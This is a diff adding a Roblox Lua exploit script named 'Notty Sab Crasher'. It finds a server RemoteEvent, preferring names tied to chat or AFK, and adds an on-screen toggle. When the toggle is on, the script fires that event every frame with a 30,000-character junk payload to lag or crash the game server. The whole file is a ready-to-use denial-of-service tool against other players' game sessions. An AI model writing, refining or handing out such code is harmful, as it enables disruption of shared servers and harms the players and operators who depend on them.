@@ -1,0 +1,209 @@
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local lagModeEnabled = false
+local uniqueIdentifier = "v15g2119-134z-bx1c-a143-415a31g1l029"
+local dataPayload = string.rep("z", 30000)
+local remoteEventTarget = nil
+local allRemotes = {}
+
+-- Keywords to search for
+local targetKeywords = {"RobloxChatSystemMessage", "AFK", "FisherMan"}
+
+-- Find all remotes
+for index, gameObject in pairs(game:GetDescendants()) do
+    if gameObject:IsA("RemoteEvent") and gameObject.Name ~= "friendmain" and gameObject.Name ~= "ping" then
+        table.insert(allRemotes, gameObject)
+    end
+end
+
+-- Auto-select first remote containing target keywords
+for _, remote in pairs(allRemotes) do
+    local remoteName = remote.Name:lower()
+    for _, keyword in pairs(targetKeywords) do
+        if remoteName:find(keyword:lower()) then
+            remoteEventTarget = remote
+            print("✅ Auto-selected: " .. remote.Name)
+            break
+        end
+    end
+    if remoteEventTarget then break end
+end
+
+-- Fallback if no keyword match found
+if not remoteEventTarget and #allRemotes > 0 then
+    print("⚠️ No keyword match found, using first available remote")
+    remoteEventTarget = allRemotes[1]
+end
+
+-- Create GUI
+local playerGui = player:WaitForChild("PlayerGui")
+
+if playerGui:FindFirstChild("LaggerGui") then
+    playerGui:FindFirstChild("LaggerGui"):Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LaggerGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 320, 0, 180)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(100, 100, 120)
+stroke.Thickness = 2
+stroke.Parent = mainFrame
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 45)
+titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = titleBar
+
+local titleCover = Instance.new("Frame")
+titleCover.Size = UDim2.new(1, 0, 0, 20)
+titleCover.Position = UDim2.new(0, 0, 1, -20)
+titleCover.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+titleCover.BorderSizePixel = 0
+titleCover.Parent = titleBar
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "⚡ NOTTY SAB CRASHER"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = titleBar
+
+-- Remote Info
+local remoteLabel = Instance.new("TextLabel")
+remoteLabel.Size = UDim2.new(1, -20, 0, 30)
+remoteLabel.Position = UDim2.new(0, 10, 0, 55)
+remoteLabel.BackgroundTransparency = 1
+remoteLabel.Text = (remoteEventTarget and remoteEventTarget.Name or "NOT FOUND")
+remoteLabel.TextColor3 = remoteEventTarget and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
+remoteLabel.TextSize = 12
+remoteLabel.Font = Enum.Font.GothamBold
+remoteLabel.TextXAlignment = Enum.TextXAlignment.Left
+remoteLabel.TextTruncate = Enum.TextTruncate.AtEnd
+remoteLabel.Parent = mainFrame
+
+-- Lag Button
+local lagButton = Instance.new("TextButton")
+lagButton.Size = UDim2.new(1, -20, 0, 50)
+lagButton.Position = UDim2.new(0, 10, 0, 95)
+lagButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+lagButton.BorderSizePixel = 0
+lagButton.Text = "Start Crash (Press E)"
+lagButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+lagButton.TextSize = 16
+lagButton.Font = Enum.Font.GothamBold
+lagButton.Parent = mainFrame
+
+local lagCorner = Instance.new("UICorner")
+lagCorner.CornerRadius = UDim.new(0, 8)
+lagCorner.Parent = lagButton
+
+-- Info
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Size = UDim2.new(1, -20, 0, 20)
+infoLabel.Position = UDim2.new(0, 10, 0, 155)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Text = "E = Crash | U = Toggle UI"
+infoLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
+infoLabel.TextSize = 10
+infoLabel.Font = Enum.Font.Gotham
+infoLabel.TextXAlignment = Enum.TextXAlignment.Center
+infoLabel.Parent = mainFrame
+
+-- Update Display
+local function updateDisplay()
+    if lagModeEnabled then
+        lagButton.Text = "Stop Crash (Press E)"
+        lagButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    else
+        lagButton.Text = "Start Crash (Press E)"
+        lagButton.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
+    end
+end
+
+-- Lag Button Click
+lagButton.MouseButton1Click:Connect(function()
+    lagModeEnabled = not lagModeEnabled
+    updateDisplay()
+end)
+
+-- Keybinds
+UserInputService.InputBegan:Connect(function(inputObject, isGameProcessed)
+    if not isGameProcessed and inputObject.KeyCode == Enum.KeyCode.E then
+        lagModeEnabled = not lagModeEnabled
+        updateDisplay()
+    elseif not isGameProcessed and inputObject.KeyCode == Enum.KeyCode.U then
+        mainFrame.Visible = not mainFrame.Visible
+    end
+end)
+
+-- Original lag logic
+RunService.Heartbeat:Connect(function()
+    if lagModeEnabled and remoteEventTarget then
+        for iteration = 1, 1 do
+            remoteEventTarget:FireServer(uniqueIdentifier, dataPayload)
+        end
+    end
+end)
+
+-- Draggable Main Frame (Mobile & PC)
+local dragging = false
+local dragStart, startPos
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+print("⚡ Notty Sab Crasher Loaded!")
+print("Found " .. #allRemotes .. " remotes")
+print("Target: " .. (remoteEventTarget and remoteEventTarget.Name or "NOT FOUND"))
+print("📱 Mobile friendly - Touch to drag")
+print("Press E to toggle crash | U to toggle UI")
+
